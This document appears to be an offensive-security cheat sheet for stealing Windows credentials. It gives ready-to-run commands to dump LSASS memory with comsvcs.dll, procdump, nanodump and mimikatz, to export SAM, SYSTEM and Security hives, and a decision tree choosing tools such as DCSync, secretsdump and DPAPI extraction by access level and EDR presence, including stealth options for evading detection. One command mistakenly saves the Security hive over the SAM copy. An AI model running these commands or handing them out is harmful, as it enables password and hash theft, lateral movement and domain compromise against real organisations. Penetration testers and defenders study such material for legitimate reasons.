# LSASS Dump Tools 
> [!NOTE]  
> Requires admin privileges 
## miniDUMP 
```
tasklist /fi "imagename eq lsass.exe" 
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
```

## procdump
```
procdump -ma lsass.exe lsass.dmp -accepteula 
```
## mimikatz 

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest           & REM WDigest plaintext (if enabled)
mimikatz # sekurlsa::kerberos          & REM Kerberos tickets
mimikatz # sekurlsa::msv               & REM NTLM hashes
```

## nanodump 
```
nanodump.exe --write C:\temp\lsass.dmp
nanodump.exe --fork --write C:\temp\lsass.dmp   & REM Fork process first (stealthier)
```
# Local Hashes

## SAM/SYSTEM 
``` 
reg save HKLM\SAM C:\temp\SAM 
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\Security C:\temp\SAM 


copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```
│
├── Have local admin on target?
│   ├── LSASS dump (§1)
│   │   ├── EDR present? → nanodump or handlekatz (stealthy)
│   │   ├── No EDR → Mimikatz or comsvcs.dll (fastest)
│   │   └── Remote only → lsassy from Linux
│   │
│   ├── Local hashes → SAM/SYSTEM extraction (§2)
│   │   ├── Local → reg save
│   │   └── Remote → secretsdump.py or CrackMapExec --sam
│   │
│   └── DPAPI secrets → SharpDPAPI or Mimikatz (§3)
│
├── Have domain admin?
│   ├── DCSync → secretsdump.py (§5, easiest, no file access needed)
│   ├── NTDS.dit extraction → ntdsutil / VSS (§5)
│   └── Domain DPAPI backup key → decrypt all user DPAPI (§3)
│
├── Only have SMB file access (no admin)?
│   ├── Check for GPP passwords (cpassword in SYSVOL)
│   ├── Check for scripts with hardcoded creds
│   └── Check for unattend.xml / web.config files
│
└── Offline dump file (.dmp)?
    ├── LSASS dump → pypykatz / Mimikatz offline (§1)
    └── SAM+SYSTEM → secretsdump.py LOCAL (§2)

    ```